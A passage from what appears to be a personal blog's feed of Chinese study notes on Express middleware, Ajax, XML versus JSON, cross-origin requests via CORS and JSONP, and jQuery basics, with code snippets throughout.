class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//导入模块</span></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="comment">//创建服务器</span></span><br><span class="line"><span class="keyword">let</span> app = express();</span><br><span class="line"></span><br><span class="line"><span class="comment">/*1.什么是express中间件？： 其实就是一个函数（这个函数有三个参数）</span></span><br><span class="line"><span class="comment">    function(req,res,next)&#123;  </span></span><br><span class="line"><span class="comment">        req:请求对象  </span></span><br><span class="line"><span class="comment">        res：响应对象  </span></span><br><span class="line"><span class="comment">        next：下一个中间件 </span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*2.express如何使用中间件?: 三种方式  </span></span><br><span class="line"><span class="comment">    app.use(&#x27;pathname&#x27;,中间件) :</span></span><br><span class="line"><span class="comment">        pathname不写: 任何请求路径都会执行这个中间件</span></span><br><span class="line"><span class="comment">        pathname写了：任何以pathname开头的请求路径都会执行这个中间件</span></span><br><span class="line"><span class="comment">    app.get(&#x27;pathname&#x27;,中间件) :  请求路径为pathname的get请求会执行这个中间件</span></span><br><span class="line"><span class="comment">    app.post(&#x27;pathname&#x27;,中间件) :  请求路径为pathname的post请求会执行这个中间件</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* 3.express处理网络请求的流程</span></span><br><span class="line"><span class="comment">    a.从上往下依次匹配请求路径，如果匹配成功则执行该中间件</span></span><br><span class="line"><span class="comment">    b.如果这个中间件中调用了：next() ，则会继续往下匹配</span></span><br><span class="line"><span class="comment">    c.如果所有的中间件都无法匹配，则会自动进入一个兜底的中间件响应返回404 not found错误</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&#x27;/abc&#x27;</span>,<span class="function">(<span class="params">req,res,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//污水净化第一步：添加絮凝剂</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">11111</span>);</span><br><span class="line">    req.a = <span class="string">&#x27;添加了絮凝剂&#x27;</span>;</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app.use(<span class="string">&#x27;/abc&#x27;</span>,<span class="function">(<span class="params">req,res,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="comment">//污水净化第二步：添加活性炭</span></span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">22222</span>);</span><br><span class="line">    req.b = <span class="string">&#x27;添加活性炭&#x27;</span>;</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&#x27;/abc&#x27;</span>,<span class="function">(<span class="params">req,res,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">33333</span>);</span><br><span class="line">    next();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&#x27;/abc&#x27;</span>,<span class="function">(<span class="params">req,res,next</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">44444</span>);</span><br><span class="line">    <span class="comment">//看下污水净化到这一步加了什么</span></span><br><span class="line">    <span class="built_in">console</span>.log(req.a);</span><br><span class="line">    <span class="built_in">console</span>.log(req.b);</span><br><span class="line">    res.send(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//express底层有一个默认的兜底中间件，如果上面所有的中间件都无法匹配或者没有结束响应，则会进入这个中间件</span></span><br><span class="line"><span class="comment">//自定义一个兜底中间件，覆盖默认的</span></span><br><span class="line">app.use(<span class="function">(<span class="params">req,res</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="number">55555</span>);</span><br><span class="line">    </span><br><span class="line">    res.send(<span class="string">&#x27;你的路径是不是写错啦&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//开启服务器</span></span><br><span class="line">app.listen(<span class="number">3000</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;success&#x27;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure><h5 id="定义解析post请求参数中间件"><a href="#定义解析post请求参数中间件" class="headerlink" title="定义解析post请求参数中间件"></a>定义解析post请求参数中间件</h5><ul><li>bodyParse</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> querystring = <span class="built_in">require</span>(<span class="string">&#x27;querystring&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">/*  导出中间件(函数)</span></span><br><span class="line"><span class="comment">    第一个参数：请求对象</span></span><br><span class="line"><span class="comment">    第二个参数：完成回调</span></span><br><span class="line"><span class="comment">        * postObject:post请求参数对象</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="built_in">module</span>.exports = <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="comment">/*如果本次请求是post请求，则解析post请求参数，</span></span><br><span class="line"><span class="comment">    并且将解析好的参数对象作为req的属性传递给下一个中间件*/</span></span><br><span class="line">    <span class="keyword">if</span> (req.method == <span class="string">&#x27;POST&#x27;</span>) &#123;</span><br><span class="line">        <span class="comment">//1.1 给req注册一个data事件</span></span><br><span class="line">        <span class="keyword">let</span> postData = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        req.on(<span class="string">&#x27;data&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params">chuck</span>) </span>&#123;</span><br><span class="line">            postData += chuck;</span><br><span class="line">        &#125;);</span><br><span class="line">        <span class="comment">//1.2给req注册一个end事件</span></span><br><span class="line">        req.on(<span class="string">&#x27;end&#x27;</span>, <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="comment">//1.3 使用 querystring模块解析post参数</span></span><br><span class="line">            <span class="keyword">let</span> postObjc = querystring.parse(postData);</span><br><span class="line">            <span class="comment">//将解析好的参数对象添加到req的属性中</span></span><br><span class="line">            req.body = postObjc;</span><br><span class="line">            <span class="comment">//执行下一个中间件</span></span><br><span class="line">            next();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li><p>index.js</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">//导入模块</span><br><span class="line">const express = require(&#x27;express&#x27;);</span><br><span class="line">//创建服务器</span><br><span class="line">let app = express();</span><br><span class="line"></span><br><span class="line">//使用中间件</span><br><span class="line">//任何请求都会进入我们自己写的中间件，并且只要是post请求就会帮你解析好参数放入req.body中</span><br><span class="line">app.use(require(&#x27;./bodyParse.js&#x27;));</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/abc&#x27;,(req,res,next)=&gt;&#123;</span><br><span class="line">    console.log(req.body);</span><br><span class="line">    //告诉客户端我收到的参数</span><br><span class="line">    res.send(req.body);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(&#x27;/efg&#x27;,(req,res,next)=&gt;&#123;</span><br><span class="line">    console.log(req.body);</span><br><span class="line">    //告诉客户端我收到的参数</span><br><span class="line">    res.send(req.body);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">//开启服务器</span><br><span class="line">app.listen(3000, () =&gt; &#123;</span><br><span class="line">    console.log(&#x27;success&#x27;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Node-js-第1天&quot;&gt;&lt;a href=&quot;#Node-js-第1天&quot; class=&quot;headerlink&quot; title=&quot;Node.js 第1天&quot;&gt;&lt;/a&gt;Node.js 第1天&lt;/h1&gt;&lt;h2 id=&quot;上午总结&quot;&gt;&lt;a href=&quot;#上午总结&quot; class=&quot;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>Ajax</title>
    <link href="https://zengxiang21.github.io/2021/12/12/Ajax/"/>
    <id>https://zengxiang21.github.io/2021/12/12/Ajax/</id>
    <published>2021-12-12T02:18:29.742Z</published>
    <updated>2021-12-21T00:59:06.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Ajax"><a href="#Ajax" class="headerlink" title="Ajax"></a>Ajax</h1><h2 id="服务器"><a href="#服务器" class="headerlink" title="服务器"></a>服务器</h2><p>通俗的讲，能够提供某种服务的机器（计算机）称为服务器。</p><h3 id="服务器类型"><a href="#服务器类型" class="headerlink" title="服务器类型"></a>服务器类型</h3><p>按照不同的划分标准，服务可划分为以下类型： </p><p>1、    按服务类型可分为：文件服务器、数据库服务器、邮件服务器、Web 服务器等；</p><p>2、    按操作系统可分为：Linux 服务器、Windows 服务器等； </p><p>3、    按应用软件可分为 Apache 服务器、Nginx 服务器、IIS 服务器、Tomcat 服务器、Node 服务器等。</p><h3 id="服务器软件"><a href="#服务器软件" class="headerlink" title="服务器软件"></a>服务器软件</h3><p>使计算机具备提供某种服务能力的应用软件，称为服务器软件，通过安装</p><p>相应的服务软件，然后进行配置后就可以使计算具备了提供某种服务的能力。 </p><p>常见的服务器软件有： </p><p>1、文件服务器：Server-U、FileZilla、VsFTP 等； </p><p>2、数据库服务器：Oracle、MySQL、PostgreSQL、MSSQL 等； </p><p>3、邮件服务器：Postfix、Sendmail 等； </p><p>HTTP 服务器：Apache、Nginx、IIS、Tomcat、NodeJS 等；</p><h3 id="HTTP-服务器"><a href="#HTTP-服务器" class="headerlink" title="HTTP 服务器"></a>HTTP 服务器</h3><p>即网站服务器，主要提供文档(文本、图片、视频、音频)浏览服务，一般安装 Apache、Nginx 服务器软件。</p><p>HTTP 服务器可以结合某一编程语言处理业务逻辑，由此进行的开发，通常</p><p>称之为服务端开发。 </p><p>常见的运行在服务端的编程语言包括 PHP、Jsp、Asp、Python、Ruby、Perl 等。</p><h2 id="Ajax-1"><a href="#Ajax-1" class="headerlink" title="Ajax"></a>Ajax</h2><h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Ajax 即“Asynchronous Javascript And XML”（异步 JavaScript 和 XML），是指一种创建交互式网页应用的网页开发技术。Ajax = 异步 JavaScript 和 XML 或者是 HTML（标准通用标记语言的子集）。Ajax 是一种用于创建快速动态网页的技术。</p><p><strong>Ajax 是一种在无需重新加载整个网页的情况下，能够更新部分网页的技术</strong>。通过在后台与服务器进行少量数据交换，Ajax 可以使网页实现异步更新。这意味着可以在不重新加载整个网页的情况下，对网页的某部分进行更新。传统的网页（不使用 Ajax）如果需要更新内容，必须重载整个网页页面。</p><p>举个简单例子，不采用 ajax 的页面，当用户在页面发起请求时，就要进行整个页面的刷新，刷新快慢取决于服务器的处理快慢。在这个过程中用户必须得等待，不能进行其他操作。也就是同步的方式。客户端和服务端传递了很多不需要的数据。效率低，用户体验差。采用ajax的页面，可以实现页面的局部更新，而不是整个页面的更新；并且发起请求后，用户还可以进行页面上的其他操作。这就是异步的方式。客户端和服务端间只传递需要的数据，效率高，用户体验性好。 </p><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p><img src="https://s2.loli.net/2021/12/17/2FjLziQOSAxH7TU.gif" alt="AJAX"></p><p><img src="https://s2.loli.net/2021/12/17/PjZkM6C8QgiEW1I.png" alt="image-20211217133555849"></p><p><img src="https://s2.loli.net/2021/12/17/HpE1FuobxrvAeOG.png" alt="img"></p><p>IE的script 元素只支持onreadystatechange事件，不支持onload事件。</p><p>FF的script 元素不支持onreadystatechange事件，只支持onload事件。</p><p>如果要在一个<script src="xx.js"> 加载完成执行一个操作，FF使用onload事件就行了，IE下则要结合onreadystatechange事件和this.readyState</p><h2 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h2><h3 id="XML概念"><a href="#XML概念" class="headerlink" title="XML概念"></a>XML概念</h3><p><strong>XML 被设计用来传输和存储数据。</strong></p><p><strong>HTML 被设计用来显示数据。</strong></p><p>XML 不是 HTML 的替代。</p><p>XML 和 HTML 为不同的目的而设计：</p><p>XML 被设计为传输和存储数据，其焦点是数据的内容。</p><p>HTML 被设计用来显示数据，其焦点是数据的外观。</p><p>HTML 旨在显示信息，而 XML 旨在传输信息。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">note</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">to</span>&gt;</span>George<span class="tag">&lt;/<span class="name">to</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">from</span>&gt;</span>John<span class="tag">&lt;/<span class="name">from</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">heading</span>&gt;</span>Reminder<span class="tag">&lt;/<span class="name">heading</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span>Don&#x27;t forget the meeting!<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">note</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="XML和json优缺点"><a href="#XML和json优缺点" class="headerlink" title="XML和json优缺点"></a>XML和json优缺点</h3><p>扩展标记语言 (Extensible Markup Language, XML) ，用于标记电子文件使其具有结构性的标记语言，可以用来标记数据、定义数据类型，是一种允许用户对自己的标记语言进行定义的源语言。 XML使用DTD(document type definition)文档类型定义来组织数据;格式统一，跨平台和语言，早已成为业界公认的标准。</p><p>JSON(JavaScript Object Notation)一种轻量级的数据交换格式，具有良好的可读和便于快速编写的特性。可在不同平台之间进行数据交换。JSON采用兼容性很高的、完全独立于语言文本格式，同时也具备类似于C语言的习惯(包括C, C++, C#, Java, JavaScript, Perl, Python等)体系的行为。这些特性使JSON成为理想的数据交换语言。</p><p>​    JSON基于JavaScript Programming Language , Standard ECMA-262 3rd Edition - December 1999 的一个子集。</p><h4 id="lt-1-gt-XML的优点"><a href="#lt-1-gt-XML的优点" class="headerlink" title="&lt;1&gt;.XML的优点"></a>&lt;1&gt;.XML的优点</h4><p>　　A.格式统一，符合标准；</p><p>　　B.容易与其他系统进行远程交互，数据共享比较方便。</p><h4 id="lt-2-gt-XML的缺点"><a href="#lt-2-gt-XML的缺点" class="headerlink" title="&lt;2&gt;.XML的缺点"></a>&lt;2&gt;.XML的缺点</h4><p>　　A.XML文件庞大，文件格式复杂，传输占带宽；</p><p>　　B.服务器端和客户端都需要花费大量代码来解析XML，导致服务器端和客户端代码变得异常复杂且不易维护；</p><p>　　C.客户端不同浏览器之间解析XML的方式不一致，需要重复编写很多代码；</p><p>　　D.服务器端和客户端解析XML花费较多的资源和时间。</p><h4 id="lt-1-gt-JSON的优点："><a href="#lt-1-gt-JSON的优点：" class="headerlink" title="&lt;1&gt;.JSON的优点："></a>&lt;1&gt;.JSON的优点：</h4><p>　　A.数据格式比较简单，易于读写，格式都是压缩的，占用带宽小；</p><p>　　B.易于解析，客户端JavaScript可以简单的通过eval()进行JSON数据的读取；</p><p>　　C.支持多种语言，包括ActionScript, C, C#, ColdFusion, Java, JavaScript, Perl, PHP, Python, Ruby等服务器端语言，便于服务器端的解析；</p><p>　　D.在PHP世界，已经有PHP-JSON和JSON-PHP出现了，偏于PHP序列化后的程序直接调用，PHP服务器端的对象、数组等能直接生成JSON格式，便于客户端的访问提取；</p><p>　　E.因为JSON格式能直接为服务器端代码使用，大大简化了服务器端和客户端的代码开发量，且完成任务不变，并且易于维护。</p><h4 id="lt-2-gt-JSON的缺点"><a href="#lt-2-gt-JSON的缺点" class="headerlink" title="&lt;2&gt;.JSON的缺点"></a>&lt;2&gt;.JSON的缺点</h4><p>　　A.没有XML格式这么推广的深入人心和喜用广泛，没有XML那么通用性；</p><p>　　B.JSON格式目前在Web Service中推广还属于初级阶段。</p><p><img src="https://s2.loli.net/2021/12/18/P9CpMTUQfG4ou2J.png" alt="服务器"></p><h2 id="跨域"><a href="#跨域" class="headerlink" title="跨域"></a>跨域</h2><h3 id="同源"><a href="#同源" class="headerlink" title="同源"></a>同源</h3><p><img src="https://s2.loli.net/2021/12/20/VdOE8BAQmCjtY79.png" alt="image-20211220211605713"></p><p><img src="https://s2.loli.net/2021/12/20/G83NQECRVFcYLJu.png" alt="image-20211220211634123"></p><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><ol><li><h4 id="CORS"><a href="#CORS" class="headerlink" title="CORS"></a>CORS</h4><p>Cross-Origin Resource Sharing跨域源资源共享</p><p>CORS（跨域资源共享,Cross-Origin Resource Sharing）定义一种跨域访问的机制，可以让AJAX实现跨域访问。CORS 允许一个域上的网络应用向另一个域提交跨域 AJAX 请求。实现此功能非常简单，只需由服务器发送一个响应头即可</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">header(“Access-Control-Allow-Origin:*”); <span class="comment">// 允许任何来源</span></span><br><span class="line">header(“Access-Control-Allow-Origin:http:<span class="comment">//local.com”); //只允许来自域名http://local.com的请求</span></span><br></pre></td></tr></table></figure></li><li><h4 id="JSONP"><a href="#JSONP" class="headerlink" title="JSONP"></a>JSONP</h4><p>json with padding</p></li></ol><p>   JSONP 主要就是利用了 script 标签没有跨域限制的这个特性来完成的。</p><p>   使用限制</p><p>   仅支持 GET 方法，如果想使用完整的 REST 接口，请使用 CORS 或者其他代理方式。</p><p>   流程解析</p><p>   1.前端定义解析函数（例如 jsonpCallback=function(){…}）</p><p>   2.通过 params 形式包装请求参数，并且声明执行函数(例如 cb=jsonpCallback)</p><p>   3.后端获取前端声明的执行函数（jsonpCallback），并以带上参数并调用执行函数的方式传递给前端。</p>   <script src="http://www.abc.com/index.php/?param1=1&callback=fnName"> </script><p><img src="C:\Users\Administrator\AppData\Roaming\Typora\typora-user-images\image-20211220215758478.png" alt="image-20211220215758478"></p><h5 id="原生JS"><a href="#原生JS" class="headerlink" title="原生JS"></a>原生JS</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//原生的实现方式</span></span><br><span class="line"><span class="keyword">let</span> script = <span class="built_in">document</span>.createElement(<span class="string">&#x27;script&#x27;</span>);</span><br><span class="line">script.src = <span class="string">&#x27;http://www.nealyang.cn/login?username=Nealyang&amp;callback=callback&#x27;</span>;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(script);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">callback</span>(<span class="params">res</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(res);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="JQuery"><a href="#JQuery" class="headerlink" title="JQuery"></a>JQuery</h5><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$.ajax(&#123;</span><br><span class="line">    <span class="attr">url</span>:<span class="string">&#x27;http://www.nealyang.cn/login&#x27;</span>,</span><br><span class="line">    <span class="attr">type</span>:<span class="string">&#x27;GET&#x27;</span>,</span><br><span class="line">    <span class="attr">dataType</span>:<span class="string">&#x27;jsonp&#x27;</span>,<span class="comment">//请求方式为jsonp</span></span><br><span class="line">    <span class="attr">jsonpCallback</span>:<span class="string">&#x27;callback&#x27;</span>,</span><br><span class="line">    <span class="attr">data</span>:&#123;</span><br><span class="line">        <span class="string">&quot;username&quot;</span>:<span class="string">&quot;Nealyang&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><h5 id="后台代码"><a href="#后台代码" class="headerlink" title="后台代码"></a>后台代码</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">  <span class="comment">// echo &#x27;console.log(&quot;数据给你,拿去&quot;)&#x27;;</span></span><br><span class="line">  <span class="comment">// doSomething</span></span><br><span class="line">  <span class="variable">$methodName</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;callback&#x27;</span>];</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 把数据 拼接到 函数名的后面</span></span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$methodName</span>.<span class="string">&#x27;(&#123;&quot;name&quot;:&quot;jack&quot;,&quot;food&quot;:&quot;西兰花&quot;&#125;)&#x27;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Ajax&quot;&gt;&lt;a href=&quot;#Ajax&quot; class=&quot;headerlink&quot; title=&quot;Ajax&quot;&gt;&lt;/a&gt;Ajax&lt;/h1&gt;&lt;h2 id=&quot;服务器&quot;&gt;&lt;a href=&quot;#服务器&quot; class=&quot;headerlink&quot; title=&quot;服务器&quot;&gt;&lt;/a&gt;服务</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>jQuery</title>
    <link href="https://zengxiang21.github.io/2021/12/03/jQuery/"/>
    <id>https://zengxiang21.github.io/2021/12/03/jQuery/</id>
    <published>2021-12-03T02:28:02.101Z</published>
    <updated>2021-12-12T02:06:25.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jQuery"><a href="#jQuery" class="headerlink" title="jQuery"></a>jQuery</h1><h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>jQuery是一个快速、简洁的JavaScript框架，是继Prototype之后又一个优秀的JavaScript代码库（ 或JavaScript框架 ）</p><p>常见javascript库</p><ul><li>jQuery</li><li>Prototype</li><li>YUI</li><li>Dojo</li><li>Ext Js</li></ul><p>jQuery封装了Javascript常用的功能代码，优化了DOM操作、事件处理、动画设计和Ajax交互。</p><p>学习jQuery本质：就是学习调用这些函数(方法)。</p><h2 id="基本使用"><a href="#基本使用" class="headerlink" title="基本使用"></a>基本使用</h2><h3 id="入口函数"><a href="#入口函数" class="headerlink" title="入口函数"></a>入口函数</h3><p>DOM加载完成再执行，相当于DOMContentLoaded</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//第一种方法</span><br><span class="line">        $(document).ready(function()&#123;</span><br><span class="line">            $(&#x27;div&#x27;).hide()</span><br><span class="line">        &#125;)</span><br><span class="line">//第二种方法</span><br><span class="line">        $(function()&#123;</span><br><span class="line">            $(&#x27;div&#x27;).hide()</span><br><span class="line">        &#125;)</span><br></pre></td></tr></table></figure><h3 id="jQuery顶级对象"><a href="#jQuery顶级对象" class="headerlink" title="jQuery顶级对象$"></a>jQuery顶级对象$</h3><p>$是jQuery的别称，在代码中可以使用jQuery代替$，一般为了方便就用$</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">jQuery(function()&#123;</span><br><span class="line">alert(&#x27;zx&#x27;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="jQuery对象和DOM对象"><a href="#jQuery对象和DOM对象" class="headerlink" title="jQuery对象和DOM对象"></a>jQuery对象和DOM对象</h3><ul><li>用原生方法获取的对象就是DOM对象</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var div=document.querySelector(&#x27;div&#x27;);</span><br></pre></td></tr></table></figure><ul><li>jQuery获取的就是jQuery对象</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;div&#x27;)</span><br></pre></td></tr></table></figure><p>jQuery对象本质是：利用$对DOM对象包装后产生的对象(为数组形式存储)</p><p>jQuery对象和DOM对象可以相互转化</p><p>原生js比jQuery更大，原生的一些属性和方法jQuery并没有给我们封装，使用这些方法必须把jQuery对象转化为DOM对象才能使用。</p><ol><li><p>DOM转jQuery</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(myVideo)</span><br></pre></td></tr></table></figure></li><li><p>jQuery转DOM</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;video&#x27;)[index]</span><br><span class="line">$(&#x27;video&#x27;).get(index)</span><br></pre></td></tr></table></figure></li></ol><h2 id="jQuery常用的API"><a href="#jQuery常用的API" class="headerlink" title="jQuery常用的API"></a>jQuery常用的API</h2><h3 id="jQuery基础选择器"><a href="#jQuery基础选择器" class="headerlink" title="jQuery基础选择器"></a>jQuery基础选择器</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;选择器&quot;)//里面直接写CSS选择器，要加引号</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/12/03/ZUJs4atc8vflHDL.png" alt="image-20211203145825399"></p><p>jQuery设置样式</p><p>jQuery不能使用style</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(&#x27;div&#x27;).css(&#x27;属性&#x27;,&#x27;值&#x27;)</span><br></pre></td></tr></table></figure><p>使用了隐式迭代</p><p><strong>隐式迭代</strong>：遍历内部的DOM元素的过程，匹配到的所有元素进行循环遍历，执行相应的方法</p><h3 id="jQuery筛选选择器"><a href="#jQuery筛选选择器" class="headerlink" title="jQuery筛选选择器"></a>jQuery筛选选择器</h3><p><img src="https://i.loli.net/2021/12/03/1cfJC9hFT36op27.png" alt="image-20211203152120984"></p><h3 id="jQuery筛选方法"><a href="#jQuery筛选方法" class="headerlink" title="jQuery筛选方法"></a>jQuery筛选方法</h3><p><img src="https://i.loli.net/2021/12/03/VU5oEGra6FB1Tcv.png" alt="image-20211203152458372"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$(&quot;li&quot;).parent()//子代选择器</span><br><span class="line">$(&quot;.nav&quot;).find(&quot;p&quot;)//后代选择器</span><br><span class="line">$(&quot;.nav&quot;).mouseover(function()&#123;&#125;)</span><br><span class="line">$(this).children(&quot; &quot;).show()</span><br><span class="line">$(&quot;ul li:eq(2)&quot;).mouseover()</span><br><span 